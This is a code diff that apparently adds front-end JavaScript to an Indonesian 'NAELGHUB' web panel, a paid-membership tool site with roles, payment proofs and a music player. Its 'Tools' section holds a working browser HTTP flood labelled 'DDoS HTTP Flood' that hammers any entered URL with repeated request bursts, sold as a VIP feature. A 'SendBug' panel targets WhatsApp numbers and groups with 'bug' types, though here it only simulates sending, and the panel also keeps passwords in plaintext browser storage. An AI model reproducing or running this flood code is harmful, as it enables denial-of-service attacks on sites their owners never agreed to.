+function addAiMessage(role,text,persist=true){
+  const c=document.getElementById('aiMessages'); if(!c) return;
+  const time=new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+  const div=document.createElement('div'); div.className='ai-msg '+role;
+  const icon=role==='user'?'fa-user':'fa-robot';
+  const name=role==='user'?(window.currentUser?.username||'You'):'NAEL-AI';
+  div.innerHTML='<div class="ai-avatar"><i class="fas '+icon+'"></i></div><div class="ai-body"><div class="ai-name">'+escapeHtml(name)+'</div><div class="ai-text">'+escapeHtml(text)+'</div><div class="ai-time">'+time+'</div></div>';
+  c.appendChild(div); c.scrollTop=c.scrollHeight;
+}
+function saveGroqKey(){ showToast('🔐 API key dikelola di Netlify, bukan di browser.'); }
+function clearGroqKey(){ showToast('🔐 Tidak ada API key Groq yang disimpan di browser.'); }
+async function loadGroqKeyToUI(){ loadAiHistory(); try{const r=await fetch(NAEL_AI_ENDPOINT,{headers:{'Accept':'application/json'}}); const d=await r.json().catch(()=>({})); if(r.ok&&d.ok){setAiState('AI server siap',true);}else{setAiState(d.error||'AI belum terkonfigurasi',false);}}catch(e){setAiState('Netlify Function AI tidak dapat diakses',false);} }
+
+/* ============ SENDBUG ============ */
+let srvActiveCategory = 'personal', srvSelectedBug = 'CSPAM';
+let srvRunning = false, backendStatus = {connected:false};
+
+window.srvTargetType = 'personal';
+function setSrvTargetType(type){
+  window.srvTargetType = type === 'group' ? 'group' : 'personal';
+  document.querySelectorAll('.srv-target-tab').forEach(b=>{
+    b.classList.toggle('active', b.dataset.targetType === window.srvTargetType);
+  });
+  const input = document.getElementById('srvTarget');
+  if(!input) return;
+  const hint = document.getElementById('srvTargetHint');
+  if(window.srvTargetType === 'group'){
+    input.placeholder = 'https://chat...';
+    if(/^62\d{8,15}$/.test(input.value)) input.value = '';
+    if(hint) hint.innerHTML = 'Format target: <b>https://chat...</b>';
+  }else{
+    input.placeholder = '62xxxxxxxxxx';
+    if(!/^62\d{8,15}$/.test(input.value)) input.value = '6285235848455';
+    if(hint) hint.innerHTML = 'Format target: <b>62xxxxxxxxxx</b>';
+  }
+}
+function renderSrvCategoryTabs(){
+  const el = document.getElementById('srvCategoryTabs'); if(!el) return;
+  el.innerHTML = Object.entries(SRV_CAT_META).map(([id,meta])=>`<button class="srv-cat-tab ${srvActiveCategory===id?'active':''}" onclick="selectSrvCategory('${id}')">${meta.label} (${meta.count})</button>`).join('');
+}
+function selectSrvCategory(cat){ srvActiveCategory=cat; srvSelectedBug=(srvBugs[cat][0]||{}).id||null; renderSrvCategoryTabs(); renderSrvBugGrid(); }
+function renderSrvBugGrid(){
+  const el = document.getElementById('srvBugGrid'); if(!el) return;
+  const bugs = srvBugs[srvActiveCategory]||[];
+  const myVIP = hasVIP();
+  el.innerHTML = bugs.map(b=>{
+    const locked = b.vipOnly && !myVIP;
+    const active = srvSelectedBug === b.id;
+    const icon = BUG_ICONS[b.id] || 'fa-shield-alt';
+    return `<div class="syam-bug-card ${active?'active':''} ${b.vipOnly?'vip':''} ${locked?'locked':''}" onclick="${locked?`showToast('⚠️ Bug butuh VIP')`:`selectSrvBug('${b.id}')`}"><div class="syam-bug-card-icon"><i class="fas ${icon}"></i></div><div class="syam-bug-card-name">${b.name}</div><div class="syam-bug-card-badge">${b.id.toLowerCase()}</div></div>`;
+  }).join('');
+}
+function selectSrvBug(id){ srvSelectedBug = id; renderSrvBugGrid(); showToast(`✅ ${id}`); }
+
+async function startServerSendBug(){
+  if(srvRunning){ showToast('⚠️ Test sedang berjalan'); return; }
+
+  const target = (document.getElementById('srvTarget')?.value || '').trim();
+  const repeat = Math.max(1, parseInt(document.getElementById('srvRepeat')?.value || '5', 10));
+  const bugType = srvSelectedBug;
+  const type = window.srvTargetType || 'personal';
+  const bug = (srvBugs[srvActiveCategory]||[]).find(b=>b.id===bugType);
+
+  if(!target){ showToast('⚠️ Target kosong'); return; }
+  if(type === 'personal' && !/^62\d{8,15}$/.test(target)){
+    showToast('⚠️ Format Personal harus 62xxxxxxxxxx');
+    return;
+  }
+  if(type === 'group' && !/^https:\/\/chat(?:\.whatsapp\.com)?\/\S+$/i.test(target)){
+    showToast('⚠️ Format Grup harus https://chat...');
+    return;
+  }
+  if(bug && bug.vipOnly && !hasVIP()){ showToast('⚠️ Fitur ini membutuhkan VIP'); return; }
+
+  const maxR = hasVIP() ? 100 : 25;
+  if(repeat > maxR){ showToast(`⚠️ Maksimal ${maxR}x`); return; }
+
+  srvRunning = true;
+  const btn = document.getElementById('srvAttackBtn');
+  const sb = document.getElementById('srvStopBtn');
+  if(btn){ btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TESTING...'; }
+  if(sb) sb.style.display = 'flex';
+
+  srvLog('[SAFE] SendBug() Safe Test Mode aktif', 'warn');
+  srvLog(`[INFO] ${type === 'personal' ? '62xxxxxxxxxx' : 'https://chat...'} | ${target}`, 'info');
+  srvLog(`[INFO] ${bugType || 'Fitur belum dipilih'} | ×${repeat}`, 'info');
+
+  for(let i=1; i<=repeat && srvRunning; i++){
+    await sleep(250);
+    srvLog(`[${String(i).padStart(2,'0')}/${repeat}] ✓ Simulasi berhasil`, 'succ');
+  }
+
+  if(srvRunning){
+    srvLog(`[DONE] Safe Test selesai — tidak ada payload dikirim`, 'succ');
+    showToast('✅ SendBug() Safe Test selesai');
+    addHistory('success', `SAFE TEST ${bugType || 'feature'} × ${repeat} → ${target}`);
+  } else {
+    srvLog('[STOP] Safe Test dihentikan', 'warn');
+  }
+
+  srvRunning = false;
+  if(btn){ btn.disabled = false; btn.innerHTML = '<i class="fas fa-spider"></i> RUN TEST'; }
+  if(sb) sb.style.display = 'none';
+}
+
+function stopServerSendBug(){
+  if(!srvRunning) return;
+  srvRunning = false;
+  srvLog('[STOP] Stopped', 'warn');
+  const btn = document.getElementById('srvAttackBtn'), sb = document.getElementById('srvStopBtn');
+  if(btn){ btn.disabled = false; btn.innerHTML = '<i class="fas fa-spider"></i> RUN TEST'; }
+  if(sb) sb.style.display = 'none';
+}
+function srvLog(text, type='info'){
+  const log = document.getElementById('srvLog'); if(!log) return;
+  const t = new Date().toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const cls = type==='succ'?'l-succ':type==='err'?'l-err':type==='warn'?'l-warn':'l-info';
+  log.innerHTML += `<span class="l-time">[${t}]</span> <span class="${cls}">${text}</span>\n`;
+  log.scrollTop = log.scrollHeight;
+}
+function saveBackendUrl(){
+  const u = document.getElementById('backendUrlInput').value.trim().replace(/\/$/,'');
+  if(!u){ showToast('⚠️ Kosong'); return; }
+  localStorage.setItem('naelghub_backend_url', u);
+  showToast('✅ Saved'); checkBackendStatus(true);
+}
+function saveBackendUrlFromSettings(){
+  const u = document.getElementById('settingsBackendUrl').value.trim().replace(/\/$/,'');
+  if(!u) return;
+  localStorage.setItem('naelghub_backend_url', u);
+  const e = document.getElementById('settingsBackendStatus'); if(e) e.textContent = '✅ ' + u;
+  showToast('✅ Saved');
+}
+function loadBackendUrlToUI(){
+  const u = getBackendUrl(); if(!u) return;
+  const a = document.getElementById('backendUrlInput'); if(a) a.value = u;
+  const b = document.getElementById('settingsBackendUrl'); if(b) b.value = u;
+}
+async function checkBackendStatus(v=false){
+  const u = getBackendUrl();
+  const i = document.getElementById('backendStatusInfo');
+  if(!u){
+    if(i) i.textContent = 'Belum di-set';
+    backendStatus.connected = false;
+    const bt = document.getElementById('backendStatusText'); if(bt) bt.textContent = 'Belum dikonfigurasi';
+    return false;
+  }
+  try{
+    const r = await fetch(u + '/api/status', { signal: AbortSignal.timeout(6000) });
+    const d = await r.json();
+    backendStatus.connected = !!d.connected;
+    if(d.connected){
+      if(i) i.innerHTML = `✅ Live — ${d.number||'?'}`;
+      const bt = document.getElementById('backendStatusText'); if(bt){ bt.textContent = '✅ '+(d.number||''); bt.style.color = '#00e676'; }
+      if(v) showToast('✅ Connected!');
+      return true;
+    } else {
+      if(i) i.innerHTML = '⚠️ Belum pairing';
+      return false;
+    }
+  }catch(e){
+    if(i) i.textContent = '❌ ' + e.message;
+    return false;
+  }
+}
+
+
+/* ============ MEMBER SECURITY / REALTIME PROFILE ============ */
+let memberSecurityListener = null;
+function currentStoredAccount(username){
+  const users=getUsers();
+  if(users[username]) return users[username];
+  if(DEFAULT_ACCOUNTS[username]) return DEFAULT_ACCOUNTS[username];
+  return null;
+}
+function getSecurityPassword(username){
+  const users=getUsers();
+  if(users[username]?.password) return users[username].password;
+  if(ACCOUNTS[username]?.pw) return ACCOUNTS[username].pw;
+  return '';
+}
+function initMemberSecurity(){
+  const u=window.currentUser?.username;
+  const cur=document.getElementById('securityCurrentUsername');
+  if(cur) cur.value=u||'';
+  const act=document.getElementById('memberSecurityActivity');
+  if(!u){ if(act)act.textContent='Tidak ada sesi aktif.'; return; }
+  if(fbDB){
+    if(memberSecurityListener) fbDB.ref('memberProfiles/'+encodeURIComponent(u)).off('value',memberSecurityListener);
+    memberSecurityListener=fbDB.ref('memberProfiles/'+encodeURIComponent(u)).on('value',snap=>{
+      const d=snap.val()||{};
+      const status=document.getElementById('memberSecurityStatus');
+      if(status) status.textContent='● '+(d.updatedAt?'Sinkron realtime':'Real-time aktif');
+      if(act) act.innerHTML=`Terakhir diperbarui: <b>${d.updatedAt?new Date(d.updatedAt).toLocaleString('id-ID'):'Belum ada'}</b> · Password tidak pernah disimpan di Firebase.`;
+      if(d.username && window.currentUser.username===u){
+        const n=document.getElementById('securityCurrentUsername'); if(n)n.value=d.username;
+      }
+    });
+  }
+}
+function validateSecurityPassword(){
+  const u=window.currentUser?.username;
+  const current=document.getElementById('securityCurrentPassword')?.value||'';
+  if(!u) throw new Error('Sesi login tidak ditemukan.');
+  if(!current || current!==getSecurityPassword(u)) throw new Error('Password sekarang salah.');
+  return u;
+}
+async function writeMemberProfile(username,patch){
+  if(!fbDB)return;
+  const key=encodeURIComponent(username);
+  await fbDB.ref('memberProfiles/'+key).update({username,updatedAt:Date.now(),...patch});
+}
+async function changeMemberUsername(){
+  try{
+    const old=validateSecurityPassword();
+    const next=(document.getElementById('securityNewUsername')?.value||'').trim();
+    if(!/^[A-Za-z0-9_]{3,24}$/.test(next)) throw new Error('Username 3–24 karakter: huruf, angka, atau _.');
+    if(next.toLowerCase()===old.toLowerCase()) throw new Error('Username baru sama dengan username sekarang.');
+    const users=getUsers();
+    if(users[next] || DEFAULT_ACCOUNTS[next]) throw new Error('Username baru sudah digunakan.');
+    const oldData=users[old] || currentStoredAccount(old);
+    if(!oldData) throw new Error('Data akun tidak ditemukan.');
+    users[next]={...oldData,profileUpdatedAt:Date.now()};
+    delete users[old];
+    if(DEFAULT_ACCOUNTS[old]){
+      let disabled=[]; try{disabled=JSON.parse(localStorage.getItem('naelghub_disabled_defaults')||'[]');}catch{}
+      if(!disabled.includes(old)) disabled.push(old);
+      localStorage.setItem('naelghub_disabled_defaults',JSON.stringify(disabled));
+    }
+    saveUsers(users);
+    const oldProfile=fbDB?fbDB.ref('memberProfiles/'+encodeURIComponent(old)):null;
+    if(fbDB){
+      await writeMemberProfile(next,{role:oldData.role||window.currentUser.role,expiry:oldData.expiry||window.currentUser.expiry,renamedFrom:old,username:next});
+      await oldProfile.remove();
+    }
+    const oldPresence=fbDB?fbDB.ref('presence/'+old):null;
+    if(fbDB){
+      await fbDB.ref('presence/'+next).set({username:next,role:oldData.role||window.currentUser.role,timestamp:Date.now(),online:true});
+      await oldPresence.remove();
+    }
+    window.currentUser.username=next;
+    setSession({username:next,role:window.currentUser.role,expiry:Date.now()+86400000,userExpiry:window.currentUser.expiry});
+    document.getElementById('securityCurrentUsername').value=next;
+    document.getElementById('securityNewUsername').value='';
+    document.getElementById('securityCurrentPassword').value='';
+    updateHeaderIdentity();
+    initMemberSecurity();
+    refreshMemberList();
+    showToast('✅ Username berhasil diperbarui & disinkronkan.');
+  }catch(e){showToast('❌ '+e.message);}
+}
+async function changeMemberPassword(){
+  try{
+    const u=validateSecurityPassword();
+    const next=document.getElementById('securityNewPassword')?.value||'';
+    const confirm=document.getElementById('securityConfirmPassword')?.value||'';
+    if(next.length<8) throw new Error('Password baru minimal 8 karakter.');
+    if(next!==confirm) throw new Error('Konfirmasi password tidak sama.');
+    if(next===getSecurityPassword(u)) throw new Error('Gunakan password yang berbeda.');
+    const users=getUsers();
+    if(!users[u]) users[u]={...(currentStoredAccount(u)||{}),role:window.currentUser.role,expiry:window.currentUser.expiry};
+    users[u].password=next;
+    users[u].passwordChangedAt=Date.now();
+    saveUsers(users);
+    if(fbDB) await writeMemberProfile(u,{role:window.currentUser.role,expiry:window.currentUser.expiry,passwordChangedAt:Date.now()});
+    document.getElementById('securityCurrentPassword').value='';
+    document.getElementById('securityNewPassword').value='';
+    document.getElementById('securityConfirmPassword').value='';
+    const act=document.getElementById('memberSecurityActivity');
+    if(act)act.innerHTML='Password terakhir diperbarui: <b>baru saja</b> · Password tidak dikirim/disimpan ke Firebase.';
+    showToast('✅ Password berhasil diganti. Silakan login ulang pada perangkat lain jika diperlukan.');
+  }catch(e){showToast('❌ '+e.message);}
+}
+function updateHeaderIdentity(){
+  const u=window.currentUser||{}; const name=u.username||''; const first=name[0]?.toUpperCase()||'?';
+  ['sidebarUsername','headerUsername','greetName'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=id==='greetName'?name.toUpperCase():name;});
+  ['sidebarAvatar','headerAvatar','greetAvatar'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=first;});
+}
+
+/* ============ MEMBER PANEL ============ */
+let memberData = [], selectedCreateRole = null;
+function buildMemberData(){
+  const users = getUsers();
+  for(const k in DEFAULT_ACCOUNTS){ if(!users[k]) users[k] = { ...DEFAULT_ACCOUNTS[k] }; }
+  saveUsers(users);
+  const names = Object.keys(users);
+  memberData = names.map((name, i)=>{
+    const u = users[name] || {};
+    const role = u.role || 'member';
+    const hash = name.split('').reduce((a,c)=>a+c.charCodeAt(0),0);
+    const online = (hash % 3 !== 0);
+    return { username: name, role, online, joined: u.expiry || '2026-01-01', lastSeen: online ? 'Sekarang' : `${(hash%59)+1}m lalu`, color: ['#ff1744','#8b00ff','#00d4ff','#ffd700','#00e676','#ff9100'][i%6] };
+  });
+  if(window.currentUser && !memberData.find(m=>m.username===window.currentUser.username)){
+    memberData.unshift({ username: window.currentUser.username, role: window.currentUser.role, online: true, joined: window.currentUser.expiry || '2026-12-31', lastSeen: 'Sekarang', color: '#ff1744' });
+  }
+  memberData.sort((a,b)=>(ROLES[b.role]?.level||0)-(ROLES[a.role]?.level||0));
+}
+function refreshMemberList(){ buildMemberData(); renderMemberList(); renderCreateAccessPanel(); showToast('✅ Refreshed'); }
+function renderCreateAccessPanel(){
+  const myRole = getMyRole();
+  const allowedRoles = CREATE_ACCESS_MATRIX[myRole] || [];
+  const card = document.getElementById('createAccessCard'); if(!card) return;
+  if(allowedRoles.length === 0){ card.style.display = 'none'; return; }
+  card.style.display = 'block';
+  const badge = document.getElementById('createAccessBadge');
+  const rcfg = ROLES[myRole];
+  if(badge) badge.innerHTML = `<span style="color:${rcfg.color};">${rcfg.emoji} ${rcfg.label}</span>`;
+  const grid = document.getElementById('createRoleGrid');
+  if(grid){
+    if(!selectedCreateRole || !allowedRoles.includes(selectedCreateRole)) selectedCreateRole = allowedRoles[0];
+    grid.innerHTML = allowedRoles.map(r=>{
+      const rc = ROLES[r]; const active = selectedCreateRole === r;
+      return `<div onclick="selectCreateRole('${r}')" style="padding:14px 8px;border:2px solid ${active?rc.color:'rgba(74,144,217,.3)'};border-radius:12px;background:${active?rc.color+'20':'rgba(255,255,255,.02)'};text-align:center;cursor:pointer;"><i class="fas ${rc.icon}" style="font-size:24px;color:${rc.color};display:block;margin-bottom:6px;"></i><div style="font-size:11px;font-weight:700;color:${active?rc.color:'#fff'};">${rc.label}</div></div>`;
+    }).join('');
+  }
+}
+function selectCreateRole(role){ selectedCreateRole = role; renderCreateAccessPanel(); }
+function togglePermanentAccess(){
+  const cb=document.getElementById('newUserPermanent');
+  const days=document.getElementById('newUserDays');
+  const notice=document.getElementById('ownerPermanentNotice');
+  const on=!!cb?.checked;
+  if(days) { days.disabled=on; days.style.opacity=on?'0.45':'1'; }
+  if(notice) notice.style.display=on?'block':'none';
+  if(on && selectedCreateRole!=='owner'){
+    selectedCreateRole='owner';
+    renderCreateAccessPanel();
+  }
+}
+function createNewAccess(){
+  if(!selectedCreateRole){ showToast('⚠️ Pilih role'); return; }
+  const username = document.getElementById('newUserUsername').value.trim();
+  const password = document.getElementById('newUserPassword').value.trim();
+  const days = parseInt(document.getElementById('newUserDays').value) || 30;
+  const permanent = !!document.getElementById('newUserPermanent')?.checked;
+  if(!username || !password){ showToast('⚠️ Isi username & password'); return; }
+  if(permanent && selectedCreateRole!=='owner'){ showToast('❌ Owner permanent harus role OWNER'); return; }
+  if(permanent && !canManageUsers()){ showToast('❌ Hanya OWNER/DEVELOPER yang boleh membuat Owner Permanent'); return; }
+  const users = getUsers();
+  if(users[username]){ showToast('❌ Username sudah ada'); return; }
+  let expiry;
+  if(permanent){ expiry='PERMANENT'; }
+  else { const exp = new Date(); exp.setDate(exp.getDate() + days); expiry = exp.toISOString().split('T')[0]; }
+  users[username] = { password, role: selectedCreateRole, expiry, permanent: permanent };
+  saveUsers(users);
+  showToast(`✅ ${username} dibuat sebagai ${ROLES[selectedCreateRole].label}${permanent?' PERMANENT':''}`);
+  document.getElementById('newUserUsername').value = '';
+  document.getElementById('newUserPassword').value = '';
+  document.getElementById('newUserPermanent').checked = false;
+  togglePermanentAccess();
+  buildMemberData(); renderMemberList();
+}
+function renderMemberList(){
+  const list = document.getElementById('memberList'); if(!list) return;
+  if(memberData.length === 0) buildMemberData();
+  const search = (document.getElementById('memberSearch')?.value || '').toLowerCase();
+  const filter = document.getElementById('memberFilter')?.value || 'all';
+  const filtered = memberData.filter(m=>{
+    const ms = m.username.toLowerCase().includes(search);
+    const mf = filter === 'all' ? true : m.role === filter;
+    return ms && mf;
+  });
+  const mt = document.getElementById('memberTotal'); if(mt) mt.textContent = memberData.length;
+  const mo = document.getElementById('memberOnline'); if(mo) mo.textContent = memberData.filter(m=>m.online).length;
+  const mv = document.getElementById('memberVip'); if(mv) mv.textContent = memberData.filter(m=>m.role==='vip').length;
+  const mr = document.getElementById('memberReseller'); if(mr) mr.textContent = memberData.filter(m=>m.role==='reseller').length;
+  if(filtered.length === 0){ list.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text-secondary);">Kosong</div>'; return; }
+  list.innerHTML = filtered.map(m=>{
+    const rcfg = ROLES[m.role] || ROLES.member;
+    return `<div class="member-item role-${m.role} ${m.online?'online':''}"><div class="member-avatar" style="background:linear-gradient(135deg,${m.color},${rcfg.color});">${m.username[0].toUpperCase()}</div><div class="member-info"><div class="name">${m.username}<span class="role-badge ${m.role}">${rcfg.emoji} ${rcfg.label}</span></div><div class="meta"><span>${m.lastSeen}</span></div></div></div>`;
+  }).join('');
+}
+
+function applyMemberPanelAccess(){
+  const listCard=document.querySelector('#memberList')?.closest('.panel-card');
+  if(listCard) listCard.style.display=canManageUsers()?'block':'none';
+  const create=document.getElementById('createAccessCard');
+  if(create && !canManageUsers()) create.style.display='none';
+}
+
+/* ============ PAYMENT PROOF ============ */
+let pendingPaymentProof = null;
+function getPaymentProofs(){ try{return JSON.parse(localStorage.getItem('naelghub_payment_proofs'))||{};}catch{return{};} }
+function savePaymentProofs(v){ localStorage.setItem('naelghub_payment_proofs',JSON.stringify(v)); }
+function previewPaymentProof(ev){
+  const f=ev?.target?.files?.[0]; const box=document.getElementById('paymentProofPreview');
+  if(!f){pendingPaymentProof=null;if(box)box.style.display='none';return;}
+  if(!f.type.startsWith('image/')){showToast('❌ Pilih file gambar');return;}
+  const r=new FileReader();
+  r.onload=()=>{ const img=new Image(); img.onload=()=>{
+    const max=1280, scale=Math.min(1,max/Math.max(img.width,img.height));
+    const c=document.createElement('canvas'); c.width=Math.max(1,Math.round(img.width*scale)); c.height=Math.max(1,Math.round(img.height*scale));
+    c.getContext('2d').drawImage(img,0,0,c.width,c.height); pendingPaymentProof=c.toDataURL('image/jpeg',0.72);
+    if(box){box.style.display='block';box.innerHTML=`<img src="${pendingPaymentProof}" style="max-width:100%;max-height:240px;border-radius:10px;border:1px solid rgba(255,255,255,.15);display:block;">`;}
+  }; img.src=r.result;}; r.readAsDataURL(f);
+}
+async function submitPaymentProof(){
+  if(!pendingPaymentProof){showToast('⚠️ Pilih SS/foto bukti dulu');return;}
+  const username=window.currentUser?.username||'unknown';
+  const proofs=getPaymentProofs();
+  proofs[username]={username,role:window.currentUser?.role||'member',image:pendingPaymentProof,status:'PENDING',time:new Date().toISOString()};
+  savePaymentProofs(proofs);
+  if(fbDB){ try{await fbDB.ref('paymentProofs/'+encodeURIComponent(username)).set(proofs[username]);}catch(e){/* local fallback tetap tersimpan */} }
+  const st=document.getElementById('paymentProofStatus'); if(st) st.innerHTML='🟡 <b>PENDING</b> — bukti sudah tersimpan dan menunggu pemeriksaan Owner/Developer.';
+  showToast('✅ Bukti pembayaran dikirim');
+  renderPaymentProofAdmin();
+}
+function renderPaymentProofAdmin(){
+  const box=document.getElementById('paymentProofAdminList'); if(!box)return;
+  const proofs=getPaymentProofs(); const entries=Object.values(proofs);
+  if(!canManageUsers()){ const mine=proofs[window.currentUser?.username]; box.innerHTML=mine?`<div style="padding:10px;border-radius:10px;background:rgba(255,193,7,.06);border:1px solid rgba(255,193,7,.18);font-size:11px;">Status bukti: <b>${mine.status||'PENDING'}</b> · ${new Date(mine.time).toLocaleString('id-ID')}</div>`:''; return; }
+  if(!entries.length){box.innerHTML='<div style="font-size:11px;color:var(--text-secondary);">Belum ada bukti pembayaran.</div>';return;}
+  box.innerHTML=entries.map((p,i)=>`<div style="display:grid;grid-template-columns:88px 1fr auto;gap:10px;align-items:center;padding:10px;margin-top:8px;border:1px solid rgba(255,255,255,.08);border-radius:10px;background:rgba(255,255,255,.025);"><img src="${p.image}" style="width:88px;height:66px;object-fit:cover;border-radius:8px;cursor:pointer;" onclick="window.open(this.src,'_blank')"><div><b>${escapeHtml(p.username)}</b><div style="font-size:10px;color:var(--text-secondary);">${escapeHtml(p.role||'member')} · ${new Date(p.time).toLocaleString('id-ID')}</div><div style="font-size:10px;margin-top:4px;">Status: <b>${p.status||'PENDING'}</b></div></div><div style="display:flex;gap:5px;flex-wrap:wrap;justify-content:flex-end;"><button class="runner-btn" style="padding:7px 9px;" onclick="setPaymentProofStatus('${encodeURIComponent(p.username)}','APPROVED')">✓</button><button class="runner-btn" style="padding:7px 9px;" onclick="setPaymentProofStatus('${encodeURIComponent(p.username)}','REJECTED')">✕</button></div></div>`).join('');
+}
+async function setPaymentProofStatus(encodedUser,status){
+  if(!canManageUsers())return showToast('❌ Akses Owner/Developer diperlukan');
+  const username=decodeURIComponent(encodedUser); const proofs=getPaymentProofs(); if(!proofs[username])return;
+  proofs[username].status=status; proofs[username].reviewedBy=window.currentUser?.username||''; proofs[username].reviewedAt=new Date().toISOString(); savePaymentProofs(proofs);
+  if(fbDB){try{await fbDB.ref('paymentProofs/'+encodeURIComponent(username)).update({status,reviewedBy:proofs[username].reviewedBy,reviewedAt:proofs[username].reviewedAt});}catch(e){}}
+  renderPaymentProofAdmin(); showToast('✅ Status: '+status);
+}
+function initPaymentProof(){ renderPaymentProofAdmin(); const mine=getPaymentProofs()[window.currentUser?.username]; const st=document.getElementById('paymentProofStatus'); if(st&&mine)st.innerHTML=`Status bukti: <b>${mine.status||'PENDING'}</b>`; }
+
+/* ============ TOOLS ============ */
+const toolsData = [
+  { id:'ddos', icon:'fa-bolt', name:'DDoS HTTP Flood', desc:'Kirim request HTTP', minRole:'vip',
+    fields:[{id:'ddosTarget', default:'https://example.com'}],
+    run: async function(inp){
+      const t = inp.ddosTarget; const log = document.getElementById('log-ddos');
+      let total=0, ok=0, f=0; window._ddosRunning = true;
+      const atk = async () => {
+        if(!window._ddosRunning) return;
+        const p = [];
+        for(let i=0; i<30; i++) p.push(fetch(t,{method:'GET',mode:'no-cors',cache:'no-store'}).then(()=>{ok++;total++;}).catch(()=>{f++;total++;}));
+        await Promise.allSettled(p);
+        if(log) log.innerHTML = `🔥 ${total} | OK: ${ok} | Fail: ${f}`;
+        if(window._ddosRunning) setTimeout(atk, 100);
+      };
+      atk();
+      return new Promise(r=>{
+        window._ddosStop = ()=>{ window._ddosRunning = false; r(`✅ Stopped. ${total}`); };
+        setTimeout(()=>{ if(window._ddosRunning){ window._ddosRunning = false; r(`⏹️ Auto. ${total}`); } }, 20000);
+      });
+    }
+  },
+  { id:'portscan', icon:'fa-search', name:'Port Scanner', desc:'Scan port', minRole:'vip',
+    fields:[{id:'portTarget', default:'google.com'}],
+    run: async function(inp){
+      try{
+        const r = await fetch(`https://api.hackertarget.com/portscan/?q=${encodeURIComponent(inp.portTarget)}`);
+        return (await r.text()).substring(0, 400);
+      }catch(e){ return '❌ ' + e.message; }
+    }
+  }
+];
+function renderTools(){
+  const c = document.getElementById('toolsGrid'); if(!c) return;
+  c.innerHTML = '';
+  toolsData.forEach(t=>{
+    const locked = getMyLevel() < ROLES[t.minRole].level;
+    const card = document.createElement('div');
+    card.style.cssText = 'background:rgba(255,23,68,.04);border:1px solid rgba(74,144,217,.2);border-radius:14px;padding:14px;' + (locked?'opacity:.5;':'');
+    let fh = '';
+    t.fields.forEach(f=>{
+      fh += `<input type="text" id="${f.id}" value="${f.default}" style="flex:1;min-width:80px;padding:8px 12px;border-radius:8px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:12px;outline:none;" />`;
+    });
+    card.innerHTML = `<div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;"><i class="fas ${t.icon}" style="font-size:20px;color:var(--accent);"></i><h4 style="font-size:13px;font-weight:600;">${t.name}</h4></div><div style="font-size:11px;color:var(--text-secondary);margin-bottom:8px;">${t.desc}</div><div style="display:flex;gap:6px;flex-wrap:wrap;">${fh}<button class="runner-btn" ${locked?'disabled':''} onclick="executeTool('${t.id}')">Run</button></div><div class="srv-log" id="log-${t.id}" style="margin-top:8px;height:80px;">▶ Ready</div>`;
+    c.appendChild(card);
+  });
+}
+async function executeTool(id){
+  const t = toolsData.find(x=>x.id===id); if(!t) return;
+  if(getMyLevel() < ROLES[t.minRole].level){ showToast('⚠️ VIP only'); return; }
+  const log = document.getElementById('log-' + id);
+  const inp = {};
+  t.fields.forEach(f=>{ const e = document.getElementById(f.id); if(e) inp[f.id] = e.value; });
+  try{
+    const r = await t.run(inp);
+    if(log) log.innerHTML = `✅ ${r}`;
+  }catch(e){
+    if(log) log.innerHTML = `❌ ${e.message}`;
+  }
+}
+
+/* ============ TRACKER ============ */
+async function trackPhoneNumber(){
+  const i = document.getElementById('trackerInput').value.trim(); if(!i) return;
+  let n = i.replace(/[^0-9+]/g, '');
+  if(n.startsWith('0')) n = '62' + n.substring(1);
+  const res = document.getElementById('trackerResult'); if(!res) return;
+  res.style.display = 'block';
+  res.innerHTML = '<div style="text-align:center;padding:16px;"><i class="fas fa-spinner fa-spin"></i></div>';
+  try{
+    const r = await fetch(`https://apilayer.net/api/validate?access_key=${getNumverifyKey()}&number=${n.replace(/^\+/,'')}&format=1`);
+    const d = await r.json();
+    if(d.valid){
+      res.innerHTML = `<div style="font-size:15px;font-weight:700;margin-bottom:8px;">${d.international_format||n}</div><div style="font-size:12px;">📍 ${d.country_name||'?'} | 📡 ${d.carrier||'?'}</div>`;
+    } else {
+      res.innerHTML = '<div style="color:#ff1744;">❌ Tidak valid</div>';
+    }
+  }catch(e){
+    res.innerHTML = '<div style="color:#ff1744;">❌ ' + e.message + '</div>';
+  }
+}
+
+/* ============ MUSIC ============ */
+let currentSongIndex = 0, isPlaying = false, audio = null;
+let songs = [];
+const JAMENDO_CLIENT_ID = '709fa152';
+const LOCAL_SONGS = [
+  {title:'Neon Night', artist:'NAELGHUB Original', duration:'0:45', file:'music/track1.mp3'},
+  {title:'Cyber Dream', artist:'NAELGHUB Original', duration:'0:45', file:'music/track2.mp3'},
+  {title:'Midnight Drive', artist:'NAELGHUB Original', duration:'0:45', file:'music/track3.mp3'}
+];
+
+async function loadMusicAPI(){
+  const list = document.getElementById('songList');
+  if(list) list.innerHTML = '<div style="padding:14px;text-align:center;color:var(--text-secondary);">Memuat musik...</div>';
+  // Local originals are the guaranteed fallback. API is attempted briefly first.
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(()=>controller.abort(), 4500);
+    const url = `https://api.jamendo.com/v3.0/tracks/?client_id=${JAMENDO_CLIENT_ID}&format=json&limit=20&order=popularity_week&audioformat=mp32`;
+    const res = await fetch(url,{signal:controller.signal,mode:'cors'});
+    clearTimeout(timer);
+    if(!res.ok) throw new Error('API musik gagal');
+    const data = await res.json();
+    const apiSongs = (data.results || []).filter(s => s.audio).map(s => ({
+      title:s.name || 'Tanpa judul', artist:s.artist_name || 'Unknown',
+      duration:formatDuration(Number(s.duration || 0)), file:s.audio, image:s.image || ''
+    }));
+    songs = apiSongs.length ? apiSongs : LOCAL_SONGS.slice();
+  } catch(e) {
+    songs = LOCAL_SONGS.slice();
+    if(typeof showToast === 'function') showToast('🎵 Musik offline aktif');
+  }
+  currentSongIndex=0;
+  renderSongList();
+  updateNowPlaying();
+}
+function formatDuration(sec){
+  if(!sec) return '--:--';
+  const m=Math.floor(sec/60), s=String(sec%60).padStart(2,'0');
+  return `${m}:${s}`;
+}
+function initAudio(){
+  audio=document.getElementById('audioPlayer'); if(!audio) return;
+  audio.volume=0.7;
+  const vc=document.getElementById('volumeControl'), vv=document.getElementById('volumeValue');
